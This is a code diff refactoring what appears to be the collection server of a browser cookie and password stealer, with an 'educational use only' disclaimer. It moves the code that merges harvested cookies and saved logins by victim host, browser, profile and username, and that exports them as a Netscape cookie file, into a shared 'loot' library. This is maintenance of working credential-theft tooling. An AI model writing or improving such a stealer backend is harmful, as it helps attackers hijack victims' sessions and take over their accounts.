@@ -7,6 +7,7 @@
 #   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING.
 #   Only use on systems you own or are explicitly authorized to test.
 import json, os, sys, time
+from cklog import loot as lootlib
 IS_WIN = (sys.platform == "win32")
 
 if IS_WIN:
@@ -88,48 +89,19 @@ def serve():
 
 def expiry(c):
     """The payload writes expirationDate; cookielog.py writes expires."""
-    try:
-        return int(c.get("expirationDate") or c.get("expires") or 0)
-    except (TypeError, ValueError):
-        return 0
+    return lootlib.expiry(c)
 
 
 def merge(new):
-    old = []
-    if os.path.exists(JSONF):
-        try:
-            with open(JSONF, encoding="utf-8") as f: old = json.load(f)
-        except Exception: pass
-    seen, out = {}, []
-    for c in old + list(new):
-        if not isinstance(c, dict) or not c.get("name") or not c.get("domain"): continue
-        # identity includes browser/profile/_username: without them every
-        # saved login of a domain (all name="password") collapsed into one and
-        # cross-profile cookies overwrote each other
-        k = (c.get("_host"), c.get("browser"), c.get("profile"), c.get("domain"),
-             c["name"], c.get("path"), c.get("_username"), c.get("_partition"),
-             c.get("value") if c["name"] == "token" else None)
-        if k not in seen:
-            seen[k] = len(out); out.append(c)
-        else:
-            out[seen[k]] = c   # most recent value wins
-    return out
+    old = lootlib.load_json(JSONF)
+    keep = lambda c: isinstance(c, dict) and c.get("name") and c.get("domain")
+    # replace=True: the most recent value wins, same as listen.py
+    return lootlib.merge([c for c in old if keep(c)],
+                         [c for c in new if keep(c)], replace=True)
 
 
 def write_txt(rows):
-    try:
-        from cookielog import netscape
-        body = netscape(rows)
-    except Exception:
-        l = []
-        for c in rows:
-            dom = (c.get("domain") or "").lstrip(".")
-            if not dom: continue
-            l.append("\t".join(["." + dom, "TRUE", c.get("path") or "/",
-                                "TRUE" if c.get("secure") else "FALSE",
-                                str(expiry(c)), c["name"], c.get("value") or ""]))
-        body = "# Netscape HTTP Cookie File\n" + "\n".join(l) + "\n"
-    with open(TXT, "w", encoding="utf-8") as f: f.write(body)
+    lootlib.write_txt(TXT, rows)
 
 
 def main():
